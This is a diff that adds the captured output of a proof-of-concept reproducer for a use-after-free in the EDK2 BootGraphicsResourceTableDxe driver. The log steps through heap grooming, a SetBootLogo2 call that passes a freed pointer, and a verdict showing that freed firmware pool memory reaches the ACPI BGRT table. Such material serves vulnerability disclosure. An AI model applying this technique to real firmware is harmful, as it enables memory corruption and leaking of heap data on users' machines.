@@ -1,0 +1,82 @@
+
+=== BootLogo2 use-after-free reproducer ===============================
+target: MdeModulePkg/Universal/Acpi/BootGraphicsResourceTableDxe
+        GetBootLogo2 :398 hands out mLogoBltBuffer
+        SetBootLogo2 :320 frees it, :327 copies from the caller's pointer
+sizes : first logo 16x16 = 1024 bytes, second logo 8x8 = 256 bytes
+
+[1] protocol at 0x000000007EBB4A30
+[2] GetBootLogo2 before we set anything: Not Ready (buffer 0x0000000000000000, 0x0)
+BGRT (before): at 0x000000007FB73000  Status=0x0001 ImageType=0x0000 ImageAddress=0x000000007E069018 Offset=(415,355)
+BGRT (before): BMP 193x58, 24 bpp, image data at +0x36, 33694 bytes
+  bgrt-image +0000: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0010: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0020: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+BGRT (before): 0 of the first 48 image bytes are 0xAF
+BGRT (before): no free poison in the sample. On a build that does not poison freed
+BGRT (before): pool memory this says nothing either way; see VERDICT above.
+[3] SetBootLogo2(my buffer 0x000000007E905018, 16x16): Success
+[4] GetBootLogo2: Success -> 0x000000007E905698 (16x16 at 0,0)
+    the driver returned its own copy (my buffer was 0x000000007E905018)
+    the copy matches my pattern for 1024 of 1024 bytes
+  held +0000: 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 
+  held +0010: 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 
+[5] seeding the 256-byte bin with 8 freed blocks
+[6] SetBootLogo2(the driver's own pointer 0x000000007E905698, 8x8) -- this is the UAF
+    returned Success
+    the seeded blocks were:
+      0x000000007E90CC18
+      0x000000007E90CD98
+      0x000000007E904018
+      0x000000007E904C18
+      0x000000007E904D98
+      0x000000007E904198
+      0x000000007E904998
+      0x000000007E904318
+[7] GetBootLogo2: Success -> 0x000000007E90CC18 (8x8)
+[8] source block 0x000000007E905698, destination block 0x000000007E90CC18
+    destination is the same block as the source : no
+    destination is one of the blocks step 5 freed : yes, index 0
+    the source address came back from AllocatePool(1024) right after the call: yes -- it was on the free list
+    the copied bytes match my pattern for 0 of 256 bytes
+    the copied bytes are all 0xAF (the pool free poison): yes
+  copied +0000: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  copied +0010: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  copied +0020: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+
+VERDICT: REPRODUCED-OBSERVED
+  The copy read memory that had been freed. The observables:
+    - the destination (0x000000007E90CC18) is a different block from the source
+      (0x000000007E905698) and it is one of the blocks this PoC itself put on the free list, so the allocation did not recycle the freed block;
+    - step [4] read the source and found this PoC's pattern in it, and the
+      pattern contains no 0xAF byte at any offset;
+    - all 256 bytes the copy produced are 0xAF, so the bytes CopyMem read were
+      NOT the pattern. Something overwrote the source between step [4] and the
+      copy, and the only thing that ran in between is FreePool at :320.
+    - and the source address was handed back by a later AllocatePool, which
+      only happens to a block that is on the free list.
+  0xAF is PcdDebugClearMemoryValue. Read the inference the right way round:
+  DxeCore poisons a pool block on free (Pool.c:789) AND on allocate
+  (Pool.c:538), so 0xAF in the destination does not by itself prove which
+  write put it there. What it does prove is that the pattern is gone: had the
+  source still held the pattern, CopyMem would have written the pattern over
+  the allocation poison, and it did not.
+
+The logo the firmware now holds is published to the ACPI BGRT at the next
+ReadyToBoot (BootGraphicsResourceTableDxe.c:484 and :503).
+[10] \BL2UAF.RTB is present, so ReadyToBoot is signalled here. Every
+     ReadyToBoot notification in this firmware runs a second time -- see the
+     README before doing this on real hardware.
+     signalled.
+BGRT (after): at 0x000000007FB73000  Status=0x0001 ImageType=0x0000 ImageAddress=0x000000007E904018 Offset=(0,0)
+BGRT (after): BMP 8x8, 24 bpp, image data at +0x36, 246 bytes
+  bgrt-image +0000: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  bgrt-image +0010: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  bgrt-image +0020: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+BGRT (after): 48 of the first 48 image bytes are 0xAF
+BGRT (after): 0xAF is PcdDebugClearMemoryValue, the byte DxeCore writes over a pool
+BGRT (after): block in CoreFreePoolI. Freed firmware heap has reached an ACPI table
+BGRT (after): the operating system reads.
+
+=== end ==============================================================
+
